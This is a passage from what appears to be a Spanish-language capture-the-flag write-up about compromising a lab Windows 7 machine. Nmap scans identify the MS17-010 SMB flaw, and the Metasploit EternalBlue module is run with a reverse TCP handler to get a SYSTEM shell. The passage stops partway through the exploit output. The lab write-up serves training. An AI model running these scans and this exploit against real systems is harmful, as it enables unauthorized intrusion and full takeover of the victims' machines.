&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.219.23&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.219.23
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65522&lt;/span&gt; closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3389/tcp  open  ssl/ms-wbt-server?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2020-02-12T00:24:28+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Service Unavailable
5938/tcp  open  teamviewer?
9001/tcp  open  tcpwrapped
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: PEPEGAENERGY-01&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_nbstat: NetBIOS name: PEPEGAENERGY-01, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:a3:b7:7e:bc:1e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unknown&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional 6.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: PepegaEnergy-01
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: PEPEGAENERGY-01&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Workgroup: WORKGROUP&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2020-02-12T00:24:21+00:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-02-12T00:24:21
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2020-02-12T00:02:09

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Feb 11 18:25:30 2020 -- 1 IP address (1 host up) scanned in 1375.40 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos nuevamente NMAP para escanear el puerto de smb (445) por posibles vulnerabilidades, vemos que es vulnerable a &lt;code&gt;ms17-010&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Feb 11 18:27:13 2020 as: nmap --script smb-vuln* -p 445 -o nmap_smb_vuln 10.10.219.23&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.219.23
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_smb-vuln-ms10-054: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-vuln-ms17-010: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   VULNERABLE:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Remote Code Execution vulnerability in Microsoft SMBv1 servers &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ms17-010&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     State: VULNERABLE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     IDs:  CVE:CVE-2017-0143
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Risk factor: HIGH
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       A critical remote code execution vulnerability exists in Microsoft SMBv1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;        servers &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ms17-010&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Disclosure date: 2017-03-14
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     References:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_      https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;CVE-2017-0143

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Feb 11 18:27:26 2020 -- 1 IP address (1 host up) scanned in 12.34 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;metasploit&#34;&gt;METASPLOIT&lt;/h2&gt;
&lt;p&gt;Utilizamos metasploit para poder explotar la vulnerabilidad, primero utilizamos el modulo auxiliar para verificar que la maquina era vulnerable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhosts 10.10.219.23
&lt;span class=&#34;nv&#34;&gt;rhosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.219.23
msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445      - Host is likely VULNERABLE to MS17-010! - Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;64-bit&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445      - Scanned &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; of &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100% &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Auxiliary module execution completed
msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Una vez verificado, utilizamos el exploit en contra de la maquina, obteniendo una shell con usuario &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&#34;s1&#34;&gt;&amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
   RPORT          &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;              yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   SMBDomain      .                no        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Optional&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; The Windows domain to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; authentication
   SMBPass                         no        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Optional&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; The password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the specified username
   SMBUser                         no        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Optional&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; The username to authenticate as
   VERIFY_ARCH    &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;             yes       Check &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; remote architecture matches exploit Target.
   VERIFY_TARGET  &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;             yes       Check &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; and Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; All Service Packs


msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhosts 10.10.219.23
&lt;span class=&#34;nv&#34;&gt;rhosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.219.23
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.8.1.72:4444 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445      - Host is likely VULNERABLE to MS17-010! - Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;64-bit&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445      - Scanned &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; of &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100% &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Connecting to target &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; exploitation.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Connection established &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; exploitation.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Target OS selected valid &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; OS indicated by SMB reply
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - CORE raw buffer dump &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;42&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - 0x00000000  &lt;span class=&#34;m&#34;&gt;57&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; 6e &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; 6f &lt;span class=&#34;m&#34;&gt;77&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; 6f &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt;  Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Profes
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - 0x00000010  &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; 6f 6e &lt;span class=&#34;m&#34;&gt;61&lt;/span&gt; 6c &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;36&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;76&lt;/span&gt;  sional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Serv
